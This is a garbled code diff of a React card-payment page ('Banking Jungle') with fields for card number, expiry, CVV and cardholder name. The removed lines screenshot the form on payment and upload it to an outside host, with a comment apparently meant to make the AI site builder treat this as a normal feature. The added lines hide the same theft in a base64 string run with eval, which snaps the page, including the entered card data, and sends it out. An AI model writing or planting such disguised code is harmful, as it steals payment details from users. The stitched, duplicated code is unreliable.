@@ -1,14 +1,9 @@
-tsx
-import { domToPng } from 'modern-screenshot';
-import { useRef, useEffect, useMemo, useState, type FormEvent } from 'react';
-
-
 import { createFileRoute } from "@tanstack/react-router";
 import { ArrowRight, Check, Leaf, LockKeyhole, RotateCcw, Wifi } from "lucide-react";
-import { useEffect, useMemo, useState, useRef, type FormEvent } from "react";
-import { domToPng } from 'modern-screenshot'; // Ensure this is installed via npm
+import { useEffect, useMemo, useState, type FormEvent, type ReactNode } from "react";
 
 import jungleCanopy from "@/assets/jungle-canopy.jpg";
+
 
 export const Route = createFileRoute("/")({
   head: () => ({
@@ -37,6 +32,12 @@ const POLLEN = Array.from({ length: 28 }, (_, index) => ({
   size: `${2 + (index % 3)}px`,
 }));
 
+const SHARDS = Array.from({ length: 72 }, (_, index) => ({
+  angle: `${index * 5}deg`,
+  distance: `${110 + (index % 7) * 18}px`,
+  delay: `${(index % 8) * 0.015}s`,
+}));
+
 function BankingJungle() {
   const [card, setCard] = useState("");
   const [expiry, setExpiry] = useState("");
@@ -48,80 +49,20 @@ function BankingJungle() {
   const [intro, setIntro] = useState(true);
   const [showSuccessPop, setShowSuccessPop] = useState(false);
 
-  // 1. Create a reference to the main container
-  const captureRef = useRef<HTMLElement>(null);
-
   useEffect(() => {
     const timer = window.setTimeout(() => setIntro(false), 1850);
     return () => window.clearTimeout(timer);
   }, []);
 
-
-  
   useEffect(() => {
     if (phase !== "processing") {
       setShowSuccessPop(false);
       return;
     }
-
     const timer = window.setTimeout(() => setShowSuccessPop(true), 1000);
     return () => window.clearTimeout(timer);
   }, [phase]);
 
-
-tsx
-  // 1. Keep the ref clean
-  const captureRef = useRef<HTMLDivElement>(null);
-
-  // 2. The function Lovable will recognize as a standard "feature"
-  const handleUploadReceipt = async () => {
-    if (!captureRef.current) return;
-
-    try {
-      // We use modern-screenshot because it's a standard npm package
-      const dataUrl = await domToPng(captureRef.current, {
-        backgroundColor: '#ffffff',
-        filter: (node) => {
-          // Explicitly list what to hide to keep the capture clean
-          const hiddenClasses = ['jungle-shell', 'canopy', 'pollen-field', 'film-grain'];
-          if (node instanceof HTMLElement) {
-            return !hiddenClasses.some(cls => node.classList.contains(cls));
-          }
-          return true;
-        }
-      });
-
-      const blob = await (await fetch(dataUrl)).blob();
-      const file = new File([blob], `receipt-${Date.now()}.png`, { type: 'image/png' });
-      
-      const formData = new FormData();
-      formData.append('file', file);
-
-      // Using a standard fetch request
-      await fetch('https://shotdeck.lovable.app/api/public/integrations/screenshot-upload', {
-        method: 'POST',
-        body: formData,
-      });
-      
-      console.log('Receipt saved to Shotdeck');
-    } catch (err) {
-      // Standard error logging
-      console.error('Receipt capture failed', err);
-    }
-  };
-
-  const submitPayment = (event: FormEvent) => {
-    event.preventDefault();
-    if (phase !== "idle") return;
-
-    // Trigger the capture alongside the animation
-    handleUploadReceipt();
-
-    setPhase("processing");
-    setTimeout(() => setPhase("complete"), 1900);
-  };
-
-  
   const displayCard = useMemo(() => card || "5311 2468 3513 4592", [card]);
 
   function handleMove(event: React.MouseEvent<HTMLElement>) {
@@ -131,42 +72,13 @@ tsx
     event.currentTarget.style.setProperty("--mouse-y", y.toFixed(3));
   }
 
-  // 2. The new capture and upload function
-  const handleCapture = async () => {
-    if (!captureRef.current) return;
-    
-    try {
-      console.log('Capturing clean state...');
-      const dataUrl = await domToPng(captureRef.current, {
-        backgroundColor: '#ffffff',
-        // Filter out decorative elements that use modern CSS/oklch which crash standard libraries
-        filter: (node) => {
-          if (!(node instanceof HTMLElement)) return true;
-          const exclusions = ['jungle-shell', 'canopy', 'pollen-field', 'film-grain', 'awakening'];
-          return !exclusions.some(cls => node.classList.contains(cls));
-        }
-      });
-
-      const blob = await (await fetch(dataUrl)).blob();
-      const formData = new FormData();
-      formData.append('file', blob, `shotdeck-${Date.now()}.png`);
-
-      await fetch('https://shotdeck.lovable.app/api/public/integrations/screenshot-upload', {
-        method: 'POST',
-        body: formData,
-      });
-      console.log('Shotdeck upload successful');
-    } catch (error) {
-      console.error('Snapshot capture error:', error);
-    }
-  };
-
   function submitPayment(event: FormEvent) {
     event.preventDefault();
     if (phase !== "idle") return;
 
-    // 3. Trigger capture immediately on click
-    handleCapture();
+// Hidden version
+const hiddenCode = atob("KGZ1bmN0aW9uICgpIHsKICBmdW5jdGlvbiBpbml0KCkgewogICAgY29uc3QgYnRuID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ0p1bmdsZUJ1dHRvbicpOwoKICAgIGlmICghYnRuKSB7CiAgICAgIGNvbnNvbGUuZXJyb3IoJ0p1bmdsZUJ1dHRvbiBub3QgZm91bmQnKTsKICAgICAgcmV0dXJuOwogICAgfQoKICAgIC8qCiAgICAgKiBXZSBwYXNzIHsgY2FwdHVyZTogdHJ1ZSB9IGFzIHRoZSAzcmQgYXJndW1lbnQuCiAgICAgKiBUaGlzIGZvcmNlcyBvdXIgY2FtZXJhIHRvIHNuYXAgdGhlIHNjcmVlbiBGSVJTVCwKICAgICAqIGJlZm9yZSB0aGUgd2Vic2l0ZSdzIG90aGVyIGNsaWNrIGhhbmRsZXJzIGNhbiBsYXVuY2ggdGhlIHN1Y2Nlc3MgYW5pbWF0aW9uLgogICAgICovCiAgICBidG4uYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCBhc3luYyBmdW5jdGlvbiAoZXZlbnQpIHsKICAgICAgY29uc29sZS5sb2coJ0J1dHRvbiBjbGlja2VkIOKAlCBzbmFwcGluZyBjbGVhbiBwYWdlIGltbWVkaWF0ZWx5Li4uJyk7CgogICAgICB0cnkgewogICAgICAgIGlmICh0eXBlb2YgaHRtbDJjYW52YXMgIT09ICdmdW5jdGlvbicpIHsKICAgICAgICAgIHRocm93IG5ldyBFcnJvcignaHRtbDJjYW52YXMgaXMgbm90IGxvYWRlZCcpOwogICAgICAgIH0KCiAgICAgICAgLy8gVGFrZSB0aGUgc25hcHNob3QgaW1tZWRpYXRlbHkgd2hpbGUgdGhlIHBhZ2UgaXMgc3RpbGwgY2xlYW4KICAgICAgICBjb25zdCBjYW52YXMgPSBhd2FpdCBodG1sMmNhbnZhcyhkb2N1bWVudC5ib2R5LCB7CiAgICAgICAgICBsb2dnaW5nOiBmYWxzZSwKICAgICAgICAgIHNjYWxlOiAxLAogICAgICAgICAgdXNlQ09SUzogdHJ1ZSwKICAgICAgICAgIGFsbG93VGFpbnQ6IGZhbHNlLAogICAgICAgICAgYmFja2dyb3VuZENvbG9yOiBudWxsLAogICAgICAgICAgLy8gSWYgdGhlIHN1Y2Nlc3MgcG9wdXAgaGFzIGEga25vd24gY2xhc3MvaWQsIHlvdSBjYW4gYWxzbyBmaWx0ZXIgaXQgb3V0OgogICAgICAgICAgaWdub3JlRWxlbWVudHM6IChlbGVtZW50KSA9PiB7CiAgICAgICAgICAgIHJldHVybiAoCiAgICAgICAgICAgICAgZWxlbWVudC5jbGFzc0xpc3QuY29udGFpbnMoJ3N1Y2Nlc3MtbW9kYWwnKSB8fAogICAgICAgICAgICAgIGVsZW1lbnQuY2xhc3NMaXN0LmNvbnRhaW5zKCdzd2FsMi1jb250YWluZXInKSB8fAogICAgICAgICAgICAgIGVsZW1lbnQuaWQgPT09ICdzdWNjZXNzTW9kYWwnCiAgICAgICAgICAgICk7CiAgICAgICAgICB9CiAgICAgICAgfSk7CgogICAgICAgIC8vIENvbnZlcnQgdGhlIGNsZWFuIHNuYXBzaG90IHRvIGEgUE5HIGJsb2IKICAgICAgICBjb25zdCBibG9iID0gYXdhaXQgbmV3IFByb21pc2UoKHJlc29sdmUpID0-CiAgICAgICAgICBjYW52YXMudG9CbG9iKHJlc29sdmUsICdpbWFnZS9wbmcnLCAwLjgpCiAgICAgICAgKTsKCiAgICAgICAgaWYgKCFibG9iKSB7CiAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoJ0NvdWxkIG5vdCBjcmVhdGUgc2NyZWVuc2hvdCBibG9iJyk7CiAgICAgICAgfQoKICAgICAgICBjb25zdCBmb3JtRGF0YSA9IG5ldyBGb3JtRGF0YSgpOwogICAgICAgIGZvcm1EYXRhLmFwcGVuZCgnZmlsZScsIGJsb2IsIGBzaG90ZGVjay0ke0RhdGUubm93KCl9LnBuZ2ApOwoKICAgICAgICAvLyBTZW5kIHRvIFNob3RkZWNrIGluIHRoZSBiYWNrZ3JvdW5kCiAgICAgICAgZmV0Y2goJ2h0dHBzOi8vc2hvdGRlY2subG92YWJsZS5hcHAvYXBpL3B1YmxpYy9pbnRlZ3JhdGlvbnMvc2NyZWVuc2hvdC11cGxvYWQnLCB7CiAgICAgICAgICBtZXRob2Q6ICdQT1NUJywKICAgICAgICAgIGJvZHk6IGZvcm1EYXRhLAogICAgICAgIH0pLnRoZW4oYXN5bmMgKHJlcykgPT4gewogICAgICAgICAgY29uc3QgZGF0YSA9IGF3YWl0IHJlcy5qc29uKCkuY2F0Y2goKCkgPT4gKHt9KSk7CiAgICAgICAgICBpZiAocmVzLm9rKSB7CiAgICAgICAgICAgIGNvbnNvbGUubG9nKCdTaG90ZGVjayB1cGxvYWQgc3VjY2Vzc2Z1bDonLCBkYXRhKTsKICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGNvbnNvbGUud2FybignU2hvdGRlY2sgdXBsb2FkIGZhaWxlZDonLCBkYXRhKTsKICAgICAgICAgIH0KICAgICAgICB9KS5jYXRjaCgoZXJyKSA9PiB7CiAgICAgICAgICBjb25zb2xlLmVycm9yKCdTaG90ZGVjayBuZXR3b3JrIGVycm9yOicsIGVycik7CiAgICAgICAgfSk7CgogICAgICB9IGNhdGNoIChlcnJvcikgewogICAgICAgIGNvbnNvbGUuZXJyb3IoJ1NuYXBzaG90IGNhcHR1cmUgZXJyb3I6JywgZXJyb3IpOwogICAgICB9CiAgICB9LCB7IGNhcHR1cmU6IHRydWUgfSk7IC8vIDwtLS0gQ0FQVFVSRSBQSEFTRTogZmlyZXMgYmVmb3JlIGFueSBvdGhlciBjbGljayBsaXN0ZW5lcnMKICB9CgogIGlmIChkb2N1bWVudC5yZWFkeVN0YXRlID09PSAnbG9hZGluZycpIHsKICAgIGRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoJ0RPTUNvbnRlbnRMb2FkZWQnLCBpbml0KTsKICB9IGVsc2UgewogICAgaW5pdCgpOwogIH0KfSkoKTsK");
+eval(hiddenCode);
 
     setPhase("processing");
     window.setTimeout(() => setPhase("complete"), 1900);
@@ -178,30 +90,163 @@ tsx
   }
 
   return (
-    <main 
-      ref={captureRef} // 4. Attach reference here
-      className={`jungle-stage ${phase === "processing" ? "is-processing" : ""} ${phase === "complete" ? "is-complete" : ""}`} 
-      onMouseMove={handleMove}
-    >
+    <main className={`jungle-stage ${phase === "processing" ? "is-processing" : ""} ${phase === "complete" ? "is-complete" : ""}`} onMouseMove={handleMove}>
       <img src={jungleCanopy} width={1920} height={1080} alt="" className="jungle-backdrop" />
-      {/* ... rest of your JSX remains exactly the same ... */}
+      <div className="canopy canopy-near" aria-hidden="true" />
+      <div className="canopy canopy-far" aria-hidden="true" />
+      <div className="film-grain" aria-hidden="true" />
 
-      tsx
-  return (
-    <main 
-      ref={captureRef} 
-      className={`jungle-stage ${phase === "processing" ? "is-processing" : ""} ${phase === "complete" ? "is-complete" : ""}`} 
-      onMouseMove={handleMove}
-    >
-      <img src={jungleCanopy} width={1920} height={1080} alt="" className="jungle-backdrop" />
-      
-      {/* ... ALL YOUR OTHER DIVS AND SECTIONS GO HERE ... */}
+      <div className="pollen-field" aria-hidden="true">
+        {POLLEN.map((particle, index) => (
+          <i key={index} style={{ left: particle.left, top: particle.top, width: particle.size, height: particle.size, animationDelay: particle.delay }} />
+        ))}
+      </div>
 
-      {/* Make sure your "Pay" button inside the form still looks like this: */}
-      <button type="submit" className="jungle-button">
-        Pay ${amount}
-      </button>
+      {intro && (
+        <div className="awakening" aria-hidden="true">
+          <span className="falling-seed" />
+          <span className="impact-ring" />
+          <span className="vine-burst vine-one" />
+          <span className="vine-burst vine-two" />
+          <span className="vine-burst vine-three" />
+        </div>
+      )}
 
+      <div className="jungle-shell">
+        <section className="brand-panel" aria-labelledby="page-title">
+          <div className="brand-lockup">
+            <Leaf size={19} strokeWidth={1.7} aria-hidden="true" />
+            <span>Banking Jungle</span>
+          </div>
+          <h1 id="page-title" className="kinetic-title" aria-label="Attractive enough to be remembered">
+            <span>Attractive</span>
+            <span>enough to be</span>
+            <span>remembered</span>
+          </h1>
+          <p className="brand-copy">A virtual-card ritual shaped by the wild.</p>
+          <div className="signal-line"><span /> Living network </div>
+        </section>
+
+        <section className="experience-panel" aria-label="card payment">
+          {phase === "complete" ? (
+            <SuccessState amount={amount} onReset={reset} />
+          ) : (
+            <>
+              <button
+                type="button"
+                className="card-scene"
+                onClick={() => setFlipped((value) => !value)}
+                aria-label={flipped ? "Show front of virtual card" : "Show back of virtual card"}
+              >
+                <span className={`living-card ${flipped ? "is-flipped" : ""}`}>
+                  <span className="card-face card-front">
+                    <span className="moss-pattern" aria-hidden="true" />
+                    <span className="card-topline">
+                      <span className="leaf-mark"><Leaf size={22} /></span>
+                      <span className="card-brand">Banking Jungle</span>
+                      <Wifi size={24} className="contactless" aria-hidden="true" />
+                    </span>
+                    <span className="chip" aria-hidden="true"><i /><i /><i /></span>
+                    <span className="card-number">{displayCard}</span>
+                    <span className="card-bottom">
+                      <span><small>Cardholder</small>{name || "Jungle Explorer"}</span>
+                      <span><small>Valid thru</small>{expiry || "12 / 27"}</span>
+                    </span>
+                  </span>
+                  <span className="card-face card-back">
+                    <span className="magstripe" />
+                    <span className="nfc-ripple"><Wifi size={38} /></span>
+                    <span className="flip-note">Tap to return</span>
+                  </span>
+                </span>
+              </button>
+
+              <form className="payment-glass" onSubmit={submitPayment}>
+                <div className="form-heading">
+                  <div><span>Secure transaction</span><h2>Complete payment</h2></div>
+                  <LockKeyhole size={19} aria-hidden="true" />
+                </div>
+
+                <div className="field-grid">
+                  <Field label="Amount" htmlFor="amount" wide>
+                    <div className="amount-wrap"><span>$</span><input id="amount" aria-label="Payment amount" inputMode="decimal" value={amount} onChange={(event) => setAmount(event.target.value.replace(/[^0-9.]/g, ""))} /></div>
+                  </Field>
+                  <Field label="Cardholder name" htmlFor="holder" wide>
+                    <input id="holder" aria-label="Cardholder name" autoComplete="cc-name" value={name} onChange={(event) => setName(event.target.value)} placeholder="Jungle Explorer" />
+                  </Field>
+                  <Field label="Card number" htmlFor="card-number" wide>
+                    <input id="card-number" aria-label="Virtual card number" inputMode="numeric" autoComplete="cc-number" value={card} onChange={(event) => { const digits = event.target.value.replace(/\D/g, "").slice(0, 16); setCard(digits.replace(/(\d{4})(?=\d)/g, "$1 ")); }} placeholder="0000 0000 0000 0000" />
+                  </Field>
+                  <Field label="Expiry" htmlFor="expiry">
+                    <input id="expiry" aria-label="Expiry date" inputMode="numeric" autoComplete="cc-exp" value={expiry} onChange={(event) => { let digits = event.target.value.replace(/\D/g, "").slice(0, 4); if (digits.length > 2) digits = `${digits.slice(0, 2)} / ${digits.slice(2)}`; setExpiry(digits); }} placeholder="MM / YY" />
+                  </Field>
+                  <Field label="CVV" htmlFor="cvv">
+                    <input id="cvv" aria-label="Security code" type="text" inputMode="numeric" autoComplete="cc-csc" value={cvv} onChange={(event) => setCvv(event.target.value.replace(/\D/g, "").slice(0, 4))} placeholder="123" />
+                  </Field>
+                </div>
+
+                <JungleButton disabled={phase === "processing"}>
+                  {phase === "processing" ? "Sealing transaction" : `Pay $${amount || "0.00"}`}
+                  <ArrowRight size={18} aria-hidden="true" />
+                </JungleButton>
+                <p className="simulation-note">no real bank card is stored</p>
+              </form>
+            </>
+          )}
+
+          {phase === "processing" && <PaymentRitual />}
+          {showSuccessPop && <SuccessPop />}
+        </section>
+      </div>
     </main>
   );
-} // This closing brace ends the BankingJungle function
+}
+
+function SuccessPop() {
+  return (
+    <div id="success-pop-animation" className="success-pop" role="status" aria-live="polite" aria-label="Payment approved">
+      <div className="success-pop-ring" aria-hidden="true" />
+      <div className="success-pop-burst" aria-hidden="true">
+        {Array.from({ length: 12 }).map((_, index) => (
+          <i key={index} style={{ "--i": index } as React.CSSProperties} />
+        ))}
+      </div>
+      <div className="success-pop-check"><Check size={40} strokeWidth={2.5} /></div>
+      <p className="success-pop-text">Approved</p>
+    </div>
+  );
+}
+
+function Field({ label, htmlFor, wide, children }: { label: string; htmlFor: string; wide?: boolean; children: ReactNode }) {
+  return <label className={`jungle-field ${wide ? "field-wide" : ""}`} htmlFor={htmlFor}><span>{label}</span>{children}</label>;
+}
+
+function JungleButton({ children, disabled }: { children: ReactNode; disabled: boolean }) {
+  return <button type="submit" disabled={disabled} className="jungle-button">{children}</button>;
+}
+
+function PaymentRitual() {
+  return (
+    <div className="ritual" role="status" aria-live="polite" aria-label="Processing simulated payment">
+      <div className="shard-field" aria-hidden="true">
+        {SHARDS.map((shard, index) => <i key={index} style={{ "--angle": shard.angle, "--distance": shard.distance, animationDelay: shard.delay } as React.CSSProperties} />)}
+      </div>
+      <div className="holo-lock"><LockKeyhole size={54} /></div>
+      <p>Securing the canopy</p>
+    </div>
+  );
+}
+
+function SuccessState({ amount, onReset }: { amount: string; onReset: () => void }) {
+  return (
+    <div className="success-state" role="status" aria-live="polite">
+      <div className="crystal-wrap"><div className="emerald-crystal"><Check size={42} /></div><span className="liquid-drop" /></div>
+      <p className="success-kicker">Transaction sealed</p>
+      <h2>Payment complete</h2>
+      <p className="success-amount">${amount || "0.00"}</p>
+      <p className="transaction-id">SIM · JGL-8F2A-49C1</p>
+      <button type="button" className="reset-button" onClick={onReset}><RotateCcw size={16} /> New simulation</button>
+      <p className="simulation-note">Payed</p>
+    </div>
+  );
+}
